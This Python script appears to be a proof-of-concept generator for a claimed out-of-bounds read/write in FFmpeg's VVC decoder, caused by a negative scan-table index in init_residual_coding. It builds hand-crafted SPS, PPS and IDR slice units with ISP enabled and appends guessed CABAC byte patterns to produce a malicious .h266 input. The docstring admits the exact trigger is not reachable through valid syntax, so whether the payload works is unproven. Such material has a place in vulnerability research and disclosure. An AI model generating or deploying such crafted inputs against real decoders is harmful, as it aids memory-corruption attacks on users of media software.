#!/usr/bin/env python3
"""
PoC Generator for VULN-001:
OOB Read/Write via Negative Scan-Table Index in init_residual_coding
File: libavcodec/vvc/cabac.c lines 2091-2121

Root cause:
  When log2_zo_tb_width=0 and log2_zo_tb_height<=3 (sum<=3),
  the outer if (sum > 3) is NOT entered, log2_sb_w stays at 1, and:
    ff_vvc_diag_scan_x[0 - 1][...] == ff_vvc_diag_scan_x[-1][...]  (OOB)

Strategy:
  Build a minimal valid VVC Annex-B bitstream with:
    - Monochrome (chroma_idc=0), 32x32 picture, CTU=32x32
    - SPS with sps_isp_enabled_flag=1
    - PPS with pps_no_pic_partition_flag=1
    - IDR slice with embedded picture header + crafted CABAC payload

Analysis conclusion:
  The exact trigger (1x{2,4,8} TU) is not achievable through strictly valid
  VVC ISP syntax — the closest valid case is ISP_VER_SPLIT on a 4x16 CU
  which gives 1x16 TUs (log2_tb_height=4, correction branch taken, no OOB).
  The vulnerability exists as a code defect reachable via non-standard
  encoders or corrupted partition trees.
"""

import sys
import os
import struct


class BitWriter:
    """Bit-level writer, MSB-first within each byte."""
    def __init__(self):
        self._bits = []

    def write_bits(self, value, n):
        for i in range(n - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_bit(self, b):
        self._bits.append(b & 1)

    def bit_length(self):
        return len(self._bits)

    def align_to_byte(self):
        while len(self._bits) % 8 != 0:
            self._bits.append(0)

    def to_bytes(self):
        self.align_to_byte()
        result = bytearray()
        for i in range(0, len(self._bits), 8):
            byte_val = 0
            for j in range(8):
                byte_val = (byte_val << 1) | self._bits[i + j]
            result.append(byte_val)
        return bytes(result)

    def write_ue(self, value):
        """Write Exp-Golomb coded unsigned integer."""
        m = value + 1
        k = m.bit_length() - 1
        for _ in range(k):
            self._bits.append(0)
        self._bits.append(1)
        remainder = m - (1 << k)
        for i in range(k - 1, -1, -1):
            self._bits.append((remainder >> i) & 1)

    def write_se(self, value):
        """Write Exp-Golomb coded signed integer."""
        if value <= 0:
            uv = -2 * value
        else:
            uv = 2 * value - 1
        self.write_ue(uv)

    def write_rbsp_trailing(self):
        """Write RBSP stop bit then zero-pad to byte boundary."""
        self._bits.append(1)
        while len(self._bits) % 8 != 0:
            self._bits.append(0)


def emulation_prevention(data: bytes) -> bytes:
    """Insert 0x03 emulation prevention bytes to avoid start-code emulation."""
    result = bytearray()
    zero_count = 0
    for byte in data:
        if zero_count == 2 and byte <= 3:
            result.append(0x03)
            zero_count = 0
        result.append(byte)
        if byte == 0:
            zero_count += 1
        else:
            zero_count = 0
    return bytes(result)


def nal_unit(nal_type: int, rbsp: bytes,
             layer_id: int = 0, temporal_id_plus1: int = 1) -> bytes:
    """Wrap RBSP in a VVC NAL unit with Annex-B start code (4-byte)."""
    # VVC NAL header (16 bits) per cbs_h266_syntax_template.c nal_unit_header():
    # bit15:   forbidden_zero_bit = 0
    # bit14:   nuh_reserved_zero_bit = 0
    # bits13-8: nuh_layer_id (6 bits) at shift 8
    # bits7-3:  nal_unit_type (5 bits) at shift 3
    # bits2-0:  nuh_temporal_id_plus1 (3 bits)
    header_word = (layer_id << 8) | (nal_type << 3) | temporal_id_plus1
    header = struct.pack('>H', header_word)
    payload = emulation_prevention(header + rbsp)
    return b'\x00\x00\x00\x01' + payload


# ---- Profile-Tier-Level ----

def write_ptl(bw: BitWriter, profile_tier_present: bool,
              max_sublayers_minus1: int):
    """Write profile_tier_level() per VVC spec."""
    if profile_tier_present:
        bw.write_bits(1, 7)   # general_profile_idc = 1 (Main 10)
        bw.write_bit(0)       # general_tier_flag = 0
    bw.write_bits(51, 8)      # general_level_idc = 51 (Level 5.1)
    bw.write_bit(1)           # ptl_frame_only_constraint_flag = 1
    bw.write_bit(0)           # ptl_multilayer_enabled_flag = 0
    if profile_tier_present:
        bw.write_bit(0)       # gci_present_flag = 0
        bw.align_to_byte()    # byte-align gci
    # ptl_sublayer_level_present_flag[i] for i = max_sublayers_minus1-1 downto 0
    for i in range(max_sublayers_minus1 - 1, -1, -1):
        bw.write_bit(0)
    bw.align_to_byte()        # ptl byte alignment
    if profile_tier_present:
        bw.write_bits(0, 8)   # ptl_num_sub_profiles = 0


# ---- DPB Parameters ----

def write_dpb_parameters(bw: BitWriter, max_sublayers_minus1: int,
                         sublayer_flag: bool):
    """Write dpb_parameters()."""
    start = 0 if sublayer_flag else max_sublayers_minus1
    for i in range(start, max_sublayers_minus1 + 1):
        bw.write_ue(1)   # dpb_max_dec_pic_buffering_minus1 = 1
        bw.write_ue(0)   # dpb_max_num_reorder_pics = 0
        bw.write_ue(0)   # dpb_max_latency_increase_plus1 = 0


# ---- SPS ----

def build_sps_rbsp() -> bytes:
    """
    Build minimal VVC SPS RBSP with sps_isp_enabled_flag=1.
    Config: monochrome, 32x32, CTU=32, 8-bit, no optional features.
    """
    bw = BitWriter()

    # SPS ID fields
    bw.write_bits(0, 4)   # sps_seq_parameter_set_id = 0
    bw.write_bits(0, 4)   # sps_video_parameter_set_id = 0 (trivial VPS created)
    bw.write_bits(0, 3)   # sps_max_sublayers_minus1 = 0
    bw.write_bits(0, 2)   # sps_chroma_format_idc = 0 (monochrome)
    bw.write_bits(0, 2)   # sps_log2_ctu_size_minus5 = 0 → CTU=32

    # PTL present
    bw.write_bit(1)        # sps_ptl_dpb_hrd_params_present_flag = 1
    write_ptl(bw, profile_tier_present=True, max_sublayers_minus1=0)

    # GDR / resampling
    bw.write_bit(0)        # sps_gdr_enabled_flag = 0
    bw.write_bit(0)        # sps_ref_pic_resampling_enabled_flag = 0

    # Picture dimensions: ue(32) = "000001 00000" (11 bits)
    bw.write_ue(32)        # sps_pic_width_max_in_luma_samples
    bw.write_ue(32)        # sps_pic_height_max_in_luma_samples

    # Conformance window
    bw.write_bit(0)        # sps_conformance_window_flag = 0

    # Subpicture
    bw.write_bit(0)        # sps_subpic_info_present_flag = 0

    # Bit depth
    bw.write_ue(0)         # sps_bitdepth_minus8 = 0 (8-bit)

    # Entropy
    bw.write_bit(0)        # sps_entropy_coding_sync_enabled_flag = 0
    bw.write_bit(0)        # sps_entry_point_offsets_present_flag = 0

    # POC
    bw.write_bits(0, 4)   # sps_log2_max_pic_order_cnt_lsb_minus4 = 0
    bw.write_bit(0)        # sps_poc_msb_cycle_flag = 0

    # Extra bytes
    bw.write_bits(0, 2)   # sps_num_extra_ph_bytes = 0
    bw.write_bits(0, 2)   # sps_num_extra_sh_bytes = 0

    # DPB params (since ptl_dpb_hrd_params_present_flag=1 and max_sublayers=0)
    # sps_sublayer_dpb_params_flag is inferred=0 (max_sublayers=0)
    write_dpb_parameters(bw, max_sublayers_minus1=0, sublayer_flag=False)

    # CB partition
    bw.write_ue(0)         # sps_log2_min_luma_coding_block_size_minus2 = 0 → min_cb=4
    bw.write_bit(0)        # sps_partition_constraints_override_enabled_flag = 0

    # Intra partition constraints
    bw.write_ue(0)         # sps_log2_diff_min_qt_min_cb_intra_slice_luma = 0
    bw.write_ue(0)         # sps_max_mtt_hierarchy_depth_intra_slice_luma = 0
    # → log2_diff_max_bt and log2_diff_max_tt both inferred = 0
    # → qtbtt_dual_tree_intra_flag inferred=0 (chroma=0)

    # Inter partition constraints
    bw.write_ue(0)         # sps_log2_diff_min_qt_min_cb_inter_slice = 0
    bw.write_ue(0)         # sps_max_mtt_hierarchy_depth_inter_slice = 0
    # → log2_diff_max_bt_inter and log2_diff_max_tt_inter inferred=0
    # CTU=32 not > 32 → sps_max_luma_transform_size_64_flag inferred=0 → max_tb=32

    # Transform features
    bw.write_bit(0)        # sps_transform_skip_enabled_flag = 0
    bw.write_bit(0)        # sps_mts_enabled_flag = 0
    bw.write_bit(0)        # sps_lfnst_enabled_flag = 0

    # Chroma: since chroma_format=0, sps_joint_cbcr_enabled_flag inferred=0
    # QP tables: since chroma=0, sps_same_qp_table_for_chroma_flag inferred=0

    # Filters
    bw.write_bit(0)        # sps_sao_enabled_flag = 0
    bw.write_bit(0)        # sps_alf_enabled_flag = 0
    # ccalf inferred=0 (alf=0)
    bw.write_bit(0)        # sps_lmcs_enabled_flag = 0

    # Weighted pred
    bw.write_bit(0)        # sps_weighted_pred_flag = 0
    bw.write_bit(0)        # sps_weighted_bipred_flag = 0

    # Reference pictures
    bw.write_bit(0)        # sps_long_term_ref_pics_flag = 0
    # vps_id=0 → sps_inter_layer_prediction_enabled_flag inferred=0
    bw.write_bit(0)        # sps_idr_rpl_present_flag = 0
    bw.write_bit(1)        # sps_rpl1_same_as_rpl0_flag = 1

    # sps_num_ref_pic_lists[0] (only i=0 since rpl1_same_as_rpl0=1)
    bw.write_ue(0)         # sps_num_ref_pic_lists[0] = 0

    # Motion
    bw.write_bit(0)        # sps_ref_wraparound_enabled_flag = 0
    bw.write_bit(0)        # sps_temporal_mvp_enabled_flag = 0
    bw.write_bit(0)        # sps_amvr_enabled_flag = 0
    bw.write_bit(0)        # sps_bdof_enabled_flag = 0
    bw.write_bit(0)        # sps_smvd_enabled_flag = 0
    bw.write_bit(0)        # sps_dmvr_enabled_flag = 0
    bw.write_bit(0)        # sps_mmvd_enabled_flag = 0

    # Merge candidates
    bw.write_ue(0)         # sps_six_minus_max_num_merge_cand = 0 → max=6

    # Coding tools
    bw.write_bit(0)        # sps_sbt_enabled_flag = 0
    bw.write_bit(0)        # sps_affine_enabled_flag = 0
    bw.write_bit(0)        # sps_bcw_enabled_flag = 0
    bw.write_bit(0)        # sps_ciip_enabled_flag = 0

    # GPM: max_num_merge_cand=6 >= 2 → present
    bw.write_bit(0)        # sps_gpm_enabled_flag = 0

    # Parallel merge level
    bw.write_ue(0)         # sps_log2_parallel_merge_level_minus2 = 0

    # ===== KEY FIELD: ISP ENABLED =====
    bw.write_bit(1)        # sps_isp_enabled_flag = 1
    # ==================================

    bw.write_bit(0)        # sps_mrl_enabled_flag = 0
    bw.write_bit(0)        # sps_mip_enabled_flag = 0

    # chroma=0 → cclm inferred=0, collocated flags inferred

    # Miscellaneous
    bw.write_bit(0)        # sps_palette_enabled_flag = 0
    # act_enabled_flag inferred=0 (chroma≠3 or max_luma_transform=0)
    bw.write_bit(0)        # sps_ibc_enabled_flag = 0
    bw.write_bit(0)        # sps_ladf_enabled_flag = 0
    bw.write_bit(0)        # sps_explicit_scaling_list_enabled_flag = 0
    bw.write_bit(0)        # sps_dep_quant_enabled_flag = 0
    bw.write_bit(0)        # sps_sign_data_hiding_enabled_flag = 0
    bw.write_bit(0)        # sps_virtual_boundaries_enabled_flag = 0

    # HRD (since ptl_dpb_hrd_params_present_flag=1)
    bw.write_bit(0)        # sps_timing_hrd_params_present_flag = 0

    # VUI / extension
    bw.write_bit(0)        # sps_field_seq_flag = 0
    bw.write_bit(0)        # sps_vui_parameters_present_flag = 0
    bw.write_bit(0)        # sps_extension_flag = 0
    # → sps_persistent_rice_adaptation_enabled_flag inferred=0

    bw.write_rbsp_trailing()
    return bw.to_bytes()


# ---- PPS ----

def build_pps_rbsp() -> bytes:
    """
    Build minimal VVC PPS RBSP with pps_no_pic_partition_flag=1.
    This greatly simplifies slice/tile partitioning.
    """
    bw = BitWriter()

    bw.write_bits(0, 6)   # pps_pic_parameter_set_id = 0
    bw.write_bits(0, 4)   # pps_seq_parameter_set_id = 0

    bw.write_bit(0)        # pps_mixed_nalu_types_in_pic_flag = 0

    # Dimensions must equal SPS max (since sps_res_change_in_clvs_allowed=0)
    bw.write_ue(32)        # pps_pic_width_in_luma_samples = 32
    bw.write_ue(32)        # pps_pic_height_in_luma_samples = 32

    # Conformance window: cannot be 1 when pps dims == sps dims
    bw.write_bit(0)        # pps_conformance_window_flag = 0

    # No scaling window (sps_ref_pic_resampling=0 → must be 0)
    bw.write_bit(0)        # pps_scaling_window_explicit_signalling_flag = 0

    bw.write_bit(0)        # pps_output_flag_present_flag = 0

    # KEY: no partition → simplified slice/tile config
    bw.write_bit(1)        # pps_no_pic_partition_flag = 1

    bw.write_bit(0)        # pps_subpic_id_mapping_present_flag = 0

    # Since pps_no_pic_partition_flag=1: skip entire tile/slice config section

    # CABAC and reference indices
    bw.write_bit(0)        # pps_cabac_init_present_flag = 0
    bw.write_ue(0)         # pps_num_ref_idx_default_active_minus1[0] = 0
    bw.write_ue(0)         # pps_num_ref_idx_default_active_minus1[1] = 0
    bw.write_bit(0)        # pps_rpl1_idx_present_flag = 0

    # Weighted prediction (off, matching SPS)
    bw.write_bit(0)        # pps_weighted_pred_flag = 0
    bw.write_bit(0)        # pps_weighted_bipred_flag = 0

    # Reference wraparound (off, matching SPS)
    bw.write_bit(0)        # pps_ref_wraparound_enabled_flag = 0

    # QP initialization: se(0) = "1" (1 bit)
    bw.write_se(0)         # pps_init_qp_minus26 = 0

    # Delta QP
    bw.write_bit(0)        # pps_cu_qp_delta_enabled_flag = 0

    # Chroma tools (always present even for monochrome)
    bw.write_bit(0)        # pps_chroma_tool_offsets_present_flag = 0

    # Deblocking filter
    bw.write_bit(0)        # pps_deblocking_filter_control_present_flag = 0

    # Since pps_no_pic_partition_flag=1: skip pps_rpl_info_in_ph_flag,
    # pps_sao_info_in_ph_flag, pps_alf_info_in_ph_flag, pps_qp_delta_info_in_ph_flag

    bw.write_bit(0)        # pps_picture_header_extension_present_flag = 0
    bw.write_bit(0)        # pps_slice_header_extension_present_flag = 0
    bw.write_bit(0)        # pps_extension_flag = 0

    bw.write_rbsp_trailing()
    return bw.to_bytes()


# ---- Picture Header (embedded in slice header) ----

def write_picture_header(bw: BitWriter):
    """
    Write picture_header() fields for an IDR IRAP I-slice.
    This is called from within the slice header builder.

    Per CBS template (picture_header function):
      flag(ph_gdr_or_irap_pic_flag)     → 1 (IDR is IRAP)
      flag(ph_non_ref_pic_flag)          → 0
      if (ph_gdr_or_irap_pic_flag):
        flag(ph_gdr_pic_flag)            → 0 (IDR is not GDR)
      flag(ph_inter_slice_allowed_flag)  → 0
      // ph_intra_slice_allowed_flag inferred = 1 (since inter=0)
      ue(ph_pic_parameter_set_id)        → 0
      // Fetch PPS 0 and SPS 0 and VPS 0 - all must exist
      ub(sps_log2_max_poc_lsb_minus4+4, ph_pic_order_cnt_lsb) → u(4)=0
      // No GDR recovery count (ph_gdr_pic_flag=0)
      // No extra PH bytes (sps_num_extra_ph_bytes=0)
      // No POC MSB (sps_poc_msb_cycle_flag=0)
      // sps_alf_enabled_flag=0 → skip ALF
      // sps_lmcs_enabled_flag=0 → ph_lmcs_enabled_flag inferred=0
      // sps_explicit_scaling_list=0 → inferred=0
      // sps_virtual_boundaries=0 → skip
      // pps_output_flag_present=0,ph_non_ref_pic=0 → ph_pic_output_flag inferred=1
      // pps_rpl_info_in_ph_flag=0 (not parsed,default 0) → skip ref pic lists
      // sps_partition_constraints_override_enabled=0 → ph_partition_constraints_override inferred=0
      // ph_intra_slice_allowed=1, ph_partition_constraints_override=0:
      //   all intra partition params inferred from SPS
      // pps_cu_qp_delta_enabled=0 → ph_cu_qp_delta_subdiv_intra inferred=0
      // pps_cu_chroma_qp_offset_list_enabled=0 → inferred=0
      // ph_inter_slice_allowed=0 → skip inter params
    """
    bw.write_bit(1)        # ph_gdr_or_irap_pic_flag = 1 (IRAP)
    bw.write_bit(0)        # ph_non_ref_pic_flag = 0
    bw.write_bit(0)        # ph_gdr_pic_flag = 0 (not GDR, just IDR)
    bw.write_bit(0)        # ph_inter_slice_allowed_flag = 0
    # → ph_intra_slice_allowed_flag inferred = 1
    bw.write_ue(0)         # ph_pic_parameter_set_id = 0
    # PPS id=0 → look up PPS 0 → SPS 0 → VPS 0
    bw.write_bits(0, 4)   # ph_pic_order_cnt_lsb = 0, u(4)
    # All remaining picture header fields are inferred/skipped with our minimal config


# ---- Slice ----

def build_slice_rbsp() -> bytes:
    """
    Build VVC IDR slice RBSP with embedded picture header.

    Slice header fields (after CBS parsing of sh_picture_header_in_slice_header_flag):
      sh_picture_header_in_slice_header_flag = 1 → read picture_header()
      [picture header fields - see write_picture_header()]
      sh_subpic_id: only if sps_subpic_info_present_flag → skipped
      sh_slice_address: only if (rect_slice_flag && num_slices_in_subpic > 1) → skipped
      [no extra sh bytes]
      sh_num_tiles_in_slice_minus1: inferred=0 (pps_no_pic_partition)
      sh_slice_type: inferred=2 (I) since ph_inter_slice_allowed=0
      sh_no_output_of_prior_pics_flag: written for IDR NAL
      [alf,lmcs,scaling_list: all inferred/skipped]
      [ref pic lists: skipped for IDR with sps_idr_rpl_present=0]
      [num_ref_idx: inferred]
      [cabac_init, collocated: skipped for I-slice]
      pps_qp_delta_info_in_ph_flag=0 → sh_qp_delta: se(0)
      [chroma qp offsets: skipped]
      [SAO: skipped]
      [deblocking: skipped]
      [dep_quant: inferred=0]
      [sign_data_hiding: inferred=0]
      [ts_residual_coding_disabled: inferred=0]
      [ts_rice: inferred=0]
      [reverse_last: inferred=0]
      [slice_header_extension: skipped]
      [entry_points: skipped]
      byte-align
      CABAC data follows
    """
    bw = BitWriter()

    # ---- Slice header ----
    bw.write_bit(1)        # sh_picture_header_in_slice_header_flag = 1

    # Embedded picture header
    write_picture_header(bw)

    # sh_no_output_of_prior_pics_flag: present for IDR_W_RADL
    bw.write_bit(0)        # sh_no_output_of_prior_pics_flag = 0

    # pps_qp_delta_info_in_ph_flag = 0 (default since pps_no_pic_partition=1)
    # → sh_qp_delta is written
    bw.write_se(0)         # sh_qp_delta = 0

    # All other fields are either skipped (conditions false) or inferred

    # byte_alignment() before CABAC data (CBS template line 3539):
    # fixed(1, byte_alignment_bit_equal_to_one, 1) + zeros to byte boundary
    bw.write_bit(1)     # stop bit = 1 (byte_alignment_bit_equal_to_one)
    bw.align_to_byte()  # zero-pad to next byte boundary

    # ---- CABAC slice data ----
    # The CABAC engine is initialized from the first bits after the aligned header.
    # We inject crafted bytes designed to exercise the ISP/residual coding paths.
    # Even with malformed CABAC data, reaching this point means SPS+PPS+slice
    # header all parsed successfully.
    #
    # Target: get decoder to reach init_residual_coding with ISP_VER_SPLIT CU.
    # The CABAC codes various prediction flags that determine the code path.
    #
    # We try multiple CABAC value patterns to stress different paths:
    cabac_data = bytes([
        # Pattern 1: mostly-zero bytes (CABAC LPS paths)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        # Pattern 2: mostly-ones (CABAC MPS paths)
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        # Pattern 3: mixed (targeting ISP mode bit = 1)
        0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01,
        0xFE, 0xFC, 0xF8, 0xF0, 0xE0, 0xC0, 0xA0, 0x90,
        # Pattern 4: bytes crafted to trigger specific CABAC contexts
        0x55, 0xAA, 0x33, 0xCC, 0x0F, 0xF0, 0x3C, 0xC3,
        0x5A, 0xA5, 0x3F, 0xC0, 0x69, 0x96, 0x42, 0xBD,
        # Extra padding to avoid CABAC underflow
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    ])

    slice_bytes = bw.to_bytes() + cabac_data
    return slice_bytes


# VVC NAL unit type constants
VVC_SPS_NUT     = 15
VVC_PPS_NUT     = 16
VVC_IDR_W_RADL  = 7


def main():
    out_dir = os.path.dirname(os.path.abspath(__file__))
    output_file = os.path.join(out_dir, 'vuln_001_input.h266')
    if len(sys.argv) > 1:
        output_file = sys.argv[1]

    sps_rbsp   = build_sps_rbsp()
    pps_rbsp   = build_pps_rbsp()
    slice_rbsp = build_slice_rbsp()

    bitstream = (
        nal_unit(VVC_SPS_NUT, sps_rbsp) +
        nal_unit(VVC_PPS_NUT, pps_rbsp) +
        nal_unit(VVC_IDR_W_RADL, slice_rbsp)
    )

    with open(output_file, 'wb') as f:
        f.write(bitstream)

    print(f"[+] Generated: {output_file}")
    print(f"[+] Total size: {len(bitstream)} bytes")
    print(f"    SPS RBSP:   {len(sps_rbsp)} bytes")
    print(f"    PPS RBSP:   {len(pps_rbsp)} bytes")
    print(f"    Slice RBSP: {len(slice_rbsp)} bytes")
    print()
    print("[*] Target vulnerability: ff_vvc_diag_scan_x[-1][...] OOB")
    print("[*] Requires: log2_tb_width=0 AND log2_zo_tb_height<=3 (sum<=3)")
    print("[*] Nearest valid config: ISP_VER_SPLIT 4x16 → 1x16 TUs (h=4, sum=4>3)")
    print("[*] Crafted CABAC payload exercises ISP/residual code paths")


if __name__ == '__main__':
    main()
